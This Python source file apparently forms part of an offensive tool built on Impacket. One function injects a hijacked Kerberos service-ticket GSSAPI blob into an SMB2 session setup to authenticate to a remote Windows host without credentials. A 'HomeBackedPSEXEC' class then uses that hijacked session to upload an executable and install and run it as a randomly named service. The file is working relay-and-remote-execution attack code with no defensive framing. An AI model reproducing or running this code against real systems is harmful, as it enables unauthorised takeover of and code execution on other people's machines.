from impacket.smb3structs import SMB2_DIALECT_21, SMB2_SESSION_SETUP, SMB2SessionSetup
from impacket.smbconnection import SMBConnection
from impacket.nt_errors import STATUS_SUCCESS
from impacket.smb3 import SessionError
from colorama import Fore

from impacket.examples import serviceinstall
from impacket.dcerpc.v5 import transport
from uuid import uuid4
import logging
import sys


# A method to get an Impcaket SMBConnection object from
# our hijacked gssapi blob containing a service ticket
def getAuthenticatedImpacketSMBConnection(remote_name, remote_destination, gssapi_blob):
    connection = SMBConnection(
        remoteName=remote_name, remoteHost=str(remote_destination), preferredDialect=SMB2_DIALECT_21
    )
    _server = connection.getSMBServer()  # <class 'impacket.smb3.SMB3'>
    sessionSetup = SMB2SessionSetup()
    sessionSetup['Flags'] = 0
    gssapi_blob_length = len(gssapi_blob)
    sessionSetup['SecurityBufferLength'] = gssapi_blob_length
    sessionSetup['Buffer'] = gssapi_blob
    packet = _server.SMB_PACKET()
    packet['Command'] = SMB2_SESSION_SETUP
    packet['Data'] = sessionSetup
    _server._Session['PreauthIntegrityHashValue'] = _server._Connection['PreauthIntegrityHashValue']
    try:
        packetID = _server.sendSMB(packet)
        ans = _server.recvSMB(packetID)
        if ans.isValidAnswer(STATUS_SUCCESS):
            print("\tKerberos auth succeeded :-)")
            _server._Session['SessionID'] = ans['SessionID']
            _server._Session['SigningRequired'] = _server._Connection['RequireSigning']
            _server._Session['Connection'] = _server._NetBIOSSession.get_socket()
            return connection
        else:
            return None
    except SessionError as e:
        print(
            f"{Fore.LIGHTRED_EX}\tSomething went wrong when hijacking the SMB connection :'("
            f"\t{e}{Fore.LIGHTYELLOW_EX}"
        )
        return None


# Our home made psexec. It is basically much simpler that the impacket one
# because we dont need to perform any sort of authentication, and because
# we dont care to get it interactive.
# It can be set up from a custom SMBConnection though, what we need here to
# run it from a hijacked SMB connection obtained through scapy !
class HomeBackedPSEXEC:
    def __init__(self, exeFile):
        self.__exeFile = exeFile
        self.__serviceName = str(uuid4())

    def run(self, connection):
        print("\tHijacking SMB session for DCE transport ...")
        rpctransport = transport.SMBTransport(remoteName=connection.getRemoteName())
        rpctransport.set_smb_connection(connection)
        return self.doStuff(rpctransport)

    def doStuff(self, rpctransport):
        # Sets up the DCE/RPC connection through SMB
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical(str(e))
            sys.exit(1)
        global dialect
        dialect = rpctransport.get_smb_connection().getDialect()
        # Copy, install and run the service
        f = open(self.__exeFile, 'rb')
        installService = serviceinstall.ServiceInstall(
            rpctransport.get_smb_connection(), f, self.__serviceName
        )
        print(f"\tInstalling service {self.__serviceName}")
        if installService.install() is False:
            f.close()
            print("\tService installation error :-(")
            return None
        f.close()
        # Returns the service to be able to uninstall it later
        return installService
